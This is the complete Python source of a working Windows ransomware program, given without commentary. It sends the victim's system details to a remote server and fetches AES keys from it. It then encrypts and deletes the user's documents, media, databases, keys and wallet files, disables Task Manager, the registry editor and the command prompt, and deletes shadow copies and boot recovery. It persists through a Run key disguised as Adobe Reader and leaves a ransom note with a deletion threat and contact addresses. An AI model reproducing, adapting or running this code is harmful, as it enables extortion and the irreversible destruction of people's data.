#!/usr/bin/python
import os, fnmatch, struct, _winreg, random, string, base64, platform, sys, time, socket, json, urllib, shutil, ctypes, urllib2
from _winreg import *
from Crypto import Random
from Crypto.Cipher import AES

userhome = os.path.expanduser('~')
my_server = 'http://www.baraherbs.co.il/js/owebia/'
victim_info = base64.b64encode(str(platform.uname()))

configurl = my_server + "victim.php?info=" + victim_info + "&ip=" + base64.b64encode(socket.gethostbyname(socket.gethostname()))
glob_config = None
try:
    
    glob_config = json.loads( urllib.urlopen(configurl).read())
    if(set(glob_config.keys()) != set(["x_ID", "x_UDP", "x_PDP"])):
        raise Exception("Failed encode Json. Trying encode new Json ...")
except IOError:
    time.sleep(1)
        
victim = glob_config[u'x_ID']
victim_r = glob_config[u'x_UDP']
victim_s = glob_config[u'x_PDP']

try:
	os.system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableRegistryTools /d 1 /f")
	os.system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableTaskMgr /d 1 /f")
	os.system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v DisableCMD /d 1 /f")
	os.system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoRun /d 1 /f")
	os.system("bcdedit /set {default} recoveryenabled No")
	os.system("bcdedit /set {default} bootstatuspolicy ignoreallfailures")
except WindowsError:
	pass

def delete_shadow():
    try:
        os.system("vssadmin Delete Shadows /All /Quiet")
    except:
        pass

def write_readme(dir, ext):
    try:
        files = open(dir+'README_FOR_DECRYPT.'+ext, 'w')
        files.write("IMPORTAN INFORMATION\n\nAll your files are encrypted with strong chiphers.\nDecrypting of your files is only possible with the decryption program, which is on our secret server.\nNote that every 6 hours, a random file is permanently deleted. The faster you are, the less files you will lose.\nAlso, in 96 hours, the key will be permanently deleted and there will be no way of recovering your files.\nTo receive your decryption program contact one of the emails:\n\n1. m4n14k@sigaint.org\n2. blackone@sigaint.org\n\nJust inform your identification ID and we will give you next instruction.\nYour personal identification ID: " + victim )
    except:
        pass

def find_files(root_dir):
    write_readme(root_dir, 'md')
    extentions = ['*.mid', '*.wma', '*.flv', '*.mkv', '*.mov', '*.avi', '*.asf', '*.mpeg', '*.vob', '*.mpg', '*.wmv', '*.fla', '*.swf', '*.wav', '*.qcow2', '*.vdi', '*.vmdk', '*.vmx', '*.gpg', '*.aes', '*.ARC', '*.PAQ', '*.tar.bz2', '*.tbk', '*.bak', '*.tar', '*.tgz', '*.rar', '*.zip', '*.djv', '*.djvu', '*.svg', '*.bmp', '*.png', '*.gif', '*.raw', '*.cgm', '*.jpeg', '*.jpg', '*.tif', '*.tiff', '*.NEF', '*.psd', '*.cmd', '*.class', '*.jar', '*.java', '*.asp', '*.brd', '*.sch', '*.dch', '*.dip', '*.vbs', '*.asm', '*.pas', '*.cpp', '*.php', '*.ldf', '*.mdf', '*.ibd', '*.MYI', '*.MYD', '*.frm', '*.odb', '*.dbf', '*.mdb', '*.sql', '*.SQLITEDB', '*.SQLITE3', '*.asc', '*.lay6', '*.lay', '*.ms11 (Security copy)', '*.sldm', '*.sldx', '*.ppsm', '*.ppsx', '*.ppam', '*.docb', '*.mml', '*.sxm', '*.otg', '*.odg', '*.uop', '*.potx', '*.potm', '*.pptx', '*.pptm', '*.std', '*.sxd', '*.pot', '*.pps', '*.sti', '*.sxi', '*.otp', '*.odp', '*.wks', '*.xltx', '*.xltm', '*.xlsx', '*.xlsm', '*.xlsb', '*.slk', '*.xlw', '*.xlt', '*.xlm', '*.xlc', '*.dif', '*.stc', '*.sxc', '*.ots', '*.ods', '*.hwp', '*.dotm', '*.dotx', '*.docm', '*.docx', '*.DOT', '*.max', '*.xml', '*.txt', '*.CSV', '*.uot', '*.RTF', '*.pdf', '*.XLS', '*.PPT', '*.stw', '*.sxw', '*.ott', '*.odt', '*.DOC', '*.pem', '*.csr', '*.crt', '*.key', 'wallet.dat']
    for dirpath, dirs, files in os.walk(root_dir):
		if 'Windows' not in dirpath:
			for basename in files:
				for ext in extentions:
					if fnmatch.fnmatch(basename, ext):
						filename = os.path.join(dirpath, basename)
						yield filename

def generate_file(filename):
    configurl = my_server + "savekey.php?file=" + base64.b64encode(str(filename)) + "&id=" + base64.b64encode(str(victim))
    glob_config = None
    try:
        
        glob_config = json.loads( urllib.urlopen(configurl).read())
        if(set(glob_config.keys()) != set(["X", "Y"])):
            raise Exception("Failed generate name. Trying new generate ...")
    except IOError:
            time.sleep(1)
        
    key = base64.b64decode(glob_config[u'X'])
    newfilename = base64.b64decode(glob_config[u'Y'])
    encrypt_file(key, filename, newfilename)

def encrypt_file(key, in_filename, newfilename, out_filename=None, chunksize=64*1024, Block=16):
    if not out_filename:
        out_filename = newfilename

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def autorun(tempdir, fileName, run):
    os.system('copy %s %s'%(fileName, tempdir))

    key = OpenKey(HKEY_LOCAL_MACHINE, run)
    runkey =[]
    try:
        i = 0
        while True:
            subkey = EnumValue(key, i)
            runkey.append(subkey[0])
            i += 1
    except WindowsError:
        pass

    if 'Adobe ReaderX' not in runkey:
        try:
            key= OpenKey(HKEY_LOCAL_MACHINE, run,0,KEY_ALL_ACCESS)
            SetValueEx(key ,'Adobe_ReaderX',0,REG_SZ,r"%TEMP%\mw.exe")
            key.Close()
        except WindowsError:
            pass
			
def autorun2(filename):
	try:
	
		shutil.move(sys.argv[0], userhome+'\\AppData\\Local\\'+filename)
		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER,'Software\Microsoft\Windows\CurrentVersion\Run',_winreg.KEY_SET_VALUE)
		_winreg.SetValueEx(key,'explore_',0,_winreg.REG_BINARY,userhome+'\\AppData\\Local\\'+filename)
		key.Close()
	except WindowsError:
		pass

tempdir = '%TEMP%'
fileName = sys.argv[0]
run = "Software\Microsoft\Windows\CurrentVersion\Run"
autorun(tempdir, fileName, run)

listdir = ("D:\\","E:\\",userhome+"\\Contacts\\",userhome+"\\Documents\\",userhome+"\\Downloads\\",userhome+"\\Favorites\\",userhome+"\\Links\\",userhome+"\\My Documents\\",userhome+"\\My Music\\",userhome+"\\My Pictures\\",userhome+"\\My Videos\\","F:\\","G:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\")

for dir_ in listdir:
	for filename in find_files(dir_):
		generate_file(filename)
		os.remove(filename)

delete_shadow()
write_readme(userhome+'\\Desktop\\', 'txt')
os.startfile(userhome+'\\Desktop\\README_FOR_DECRYPT.txt')
autorun2("DCBC2A71-70D8-4DAN-EHR8-E0D61DEA3FDF.exe")
